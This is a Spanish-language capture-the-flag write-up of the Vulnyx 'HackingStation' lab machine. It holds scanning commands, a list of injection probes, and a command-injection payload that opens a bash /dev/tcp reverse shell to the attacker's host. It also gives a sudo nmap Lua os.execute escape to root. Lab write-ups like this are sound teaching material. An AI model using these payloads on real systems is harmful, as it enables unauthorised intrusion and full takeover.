# WRITEUP - HACKINGSTATTION - VULNYX #
![image](https://github.com/Koh4kU/Writeups/assets/82893511/34eb39b4-93b9-49b7-b8e5-30dc668567f9)
### Recon/Scanning network: ###
Empezamos identificando el activo víctima a explotar dentro de nuestra red con un reconocimiento completo de ella:
```shell
$ netdiscover -r 10.0.2.0/24
```
~~Meter imagen del resultado~~  
Identificamos la ip de nuestra víctima, ahora podemos empezar a escanear el activo para identificar posibles vectores de entrada.  
Ejecutamos un escaneo con nmap en el que escaneamos todos los 65535 puertos (-p-), que nos identifique todos aquellos puertos abiertos (--open), con un ratio mínimo de 5000 paquetes por segundo (--min-rate 5000), sin resolución DNS (-n) y sin host discovery (-Pn). [First scan](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/HackingStation/nmap/first-scan).
```console
$ nmap -p- --open --min-rate 5000 -n -Pn 10.0.2.6
```
```shell
Nmap scan report for 10.0.2.6
Host is up (0.00059s latency).
Not shown: 44294 closed tcp ports (reset), 21240 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:E1:40:2F (Oracle VirtualBox virtual NIC)

# Nmap done at Thu Apr 18 13:31:48 2024 -- 1 IP address (1 host up) scanned in 18.70 seconds
```
Observamos que solo existe un puerto abierto con el escaneo realizado, por lo que vamos a ejecutar un escaneo sobre servicios y con unos scripts por defecto para el análisis. [Scan services](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/HackingStation/nmap/scan-services).
```shell
$ nmap -p80 -sVC 10.0.2.6 
```
```shell
Nmap scan report for 10.0.2.6
Host is up (0.00069s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: HackingStation
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:E1:40:2F (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 18 13:33:06 2024 -- 1 IP address (1 host up) scanned in 6.94 seconds
```
### Enumeration ###
Como podemos comprobar, tiene un servicio HTTP con un apache 2.4.57, el cuál si buscamos un poco de información, podemos ver que está relacionado con el CVE-2023-31122, el cuál nos permite ejecutar un RCE (Remote Command Execution), no indagaremos más por ahora sobre está vulnerabilidad pero está bien tenerla en mente.  
Teniendo este servicio web, podemos dejar un dirbuster ejecutando mientras nosotros analizamos de forma manual el servicio web. [Dirbuster](https://github.com/Koh4kU/Writeups/blob/main/Vulnyx/HackingStation/enumeration/dirbuster_80).
```shell
$ dirb http://10.0.2.6:80
```
Dejamos la ejecución de dirbuster corriendo y mientras vamos a echar un vistazo al servicio web. Al entrar con el navegador, podemos ver la página principal. Este servicio web parece tener la funcionalidad de ser un repositorio de exploits en el que se pueden buscar mediante el cuadro de texto abajo. Al ver este cuadro de texto habilitado, podemos empezar a probar cualquier Injección de Comandos para ver si es vulnerable o no.   
~~Imagen página web~~  
### Exploitation ###
Antes de empezar a inyectar comandos, podemos buscar por ejemplo qué vulnerabilidades tiene apache 2.4.57 y ver el funcionamiento del servicio.  
~~Imagen búsqueda apache~~  
Identificamos que el servicio ejecuta un archivo php para hacer la búsqueda llamado queryExploit.php. Gracias a esto, ya sabemos que el servicio web usa por debajo php y nos sirve para hacer inyecciones en php o relacionado. Podemos probar a ejecutar dentro del cuadro de búsqueda de la página principal comandos como:
- PHP:
	- ";exec("ls")
 	- ';exec("ls")
  	- ");exec("ls")
  	- ');exec("ls")
- SQL:
	- '; select * --
- JS:
	- ;alert("Hacked")
 	- ";alert("Hacked")
  	- ';alert("Hacked")
  	- ");alert("Hacked")
  	- ');alert("hacked")

Pero ninguno de estos intentos nos va a funcionar. Si analizamos un poco la respuesta del servidor, observamos que nos referencia un path en el que se encuentra el posible repositorio en el que se apoya el servicio web, siendo este path: */opt/snap/core22/searchsploit/298/*. Esto nos puede dar una pista de que el comando que se está ejecutando al buscar el exploit dentro del repositorio, es un comando de sistema y al saber que estamos aparentemente ante un sistema Debian (Linux) por el escaneo de servicios realizado anteriormete, podemos probar a ejecutar comandos de sistema. Por ejemplo vamos a ejecutar un *whoami* para ver si esto es posible:  
~~Imagen búsqueda~~  
Al ejecutar esto, vemos que al final de la página, nos devuelve "hacker". Podemos confirmar que este es el método que está utilizando el servicio por dentro y acabamos de ejecutar un comando de forma remota en el sistema.  
~~Imagen resultado~~
### Gaining access ###
Una vez comprobado esto, vamos a enviarnos una reverse shell para conseguir conectarnos con una terminal y poder seguir con la intrusión de forma más sencilla y cómoda. Para esto dejamos nuestra máquina a la escucha por un puerto aleatorio, por ejemplo, 443, a la espera de una conexión.
```shell
$ nc -nlvp 443
```
Mientras, hacemos una búsqueda ejecutando una reverse shell sobre el servicio web con: *;bash -c 'bash -i >& /dev/tcp/10.0.2.4/443 0>&1'* y ejecutamos.  
Acabamos de recibir una shell con el usuario hacker sobre la máquina víctima.  
~~Imagen intrusion~~  
Tenemos una shell, pero debemos realizar un tratamiento adecuado de la shell para que nos resulte más cómodo:
```shell
$ script /dev/null -c bash
$ ctrl+z
$ stty raw -echo;fg
$ reset xterm
$ export TERM=xterm
$ export SHELL=bash
```
Recibimos una shell tratada. Una vez hecho esto, podemos buscar la flag del usuario hacker, la cual estará en su directorio home: */home/hacker/user.txt*.  
~~imagen user flag~~
### Privilege escalation ###
Una vez tenemos el accesso con un usuario sin privilegios aparentes, toca escalar a root para obtener el control total de la máquina. Empezamos visualizando los permisos propios del usuario, sus grupos, si tiene un crontab asociado y posibles archivos con permisos SUID/GUID que nos permitan escalar, pero no vemos nada aparentemente. Vamos a listar si el usuario tiene algún permiso a nivel de *sudo* y vemos que puede ejecutar como root un binario */usr/bin/nmap*.  
```shell
$ sudo -l
```
~~Imagen captura sudo -l~~  
Probamos a ejecutar el comando y vemos que tiene un funcionamiento como nmap. Podemos de hecho, realizar un escaneo a localhost y poder ver servicios levantados solo de forma interna.  
```shell
$ sudo nmap 127.0.0.1
```
~~nmap 127.0.0.1~~  
Observamos que nos aparece ssh abierto. Este servicio aunque salga abierto, no es accesible de forma externa a la máquina, tal y como vimos en los primeros escaneos realizados de forma remota. Esto simplemente es una curiosidad, no nos ayudará a escalar o comprometer más la máquina.  
Si recordamos, nmap se puede implementar con scripts, por lo que podemos intentar ejecutar algún script propio mediante nmap y que nos devuelva una shell como root. Esto debido a que como podemos ejecutar nmap como root, si conseguimos que nmap ejecute una shell mediante un script, nos devolverá una shell con el usuario que ejecuta nmap, root. Haciendo una búsqueda para ver cómo crear scripts *.lua* propios y ejecutarlos con nmap, nos topamos con una web llamada **GTFOBins**, la cual es un repositorio de diferentes binarios a ejecutar en entornos en los que haya pocos recursos.  
~~Imagen GFTObins~~  
Tenemos una entrada para nmap y bajando, encontramos una sección para ejecutar una shell mediante nmap. Hay dos formas:
- nmap --interactive: Solo entre las versiones 2.02 a 5.21.
- *Input echo is disabled*:
Debido a que nuestra versión es 7.x, nos queda probar la segunda opción. Esta opción consiste en crear un temporal que contenga la sentencia *os.execute()* que nos permite ejecutar comandos del sistema, de esta forma, podemos intentar ejecutar una shell. 
```shell
$ BASH=$(mktemp)
$ echo 'os.execute("/bin/bash")' > $BASH
$ sudo nmap --script=$BASH
```
~~Captura ejecución nmap con sudo y obtencion de root~~  
Hemos conseguido obtener una shell como root. Una vez hecho esto, tenemos completo control del sistema. Nos spawnea una shell en la que no nos aparece lo que escribimos, para recibir una shell en condiciones podríamos ejecutarnos una reverse shell y captarla como hemos hecho en pasos anteriores, activar de forma externa ssh y entrar mediante una clave pública... etc. Nosotros lo que vamos a obtener ahora es la flag de root, la cual se encuentra en */root/root.txt*.  
~~Imagen obtencion root.txt~~  
### Adicional ###
Si recordáis, en la parte de enumeración del activo, habíamos ejecutado un dirbuster el cual no nos ha hecho falta para poder comprometer el objetivo. De todas formas, este dirbuster nos identifica una ruta en el servicio web que nos lleva a una librerñia de jQuery. En principio, no he encontrado nada interesante en esa ruta: *http://10.0.2.6:80/javascript/jQwery/jQuery*.
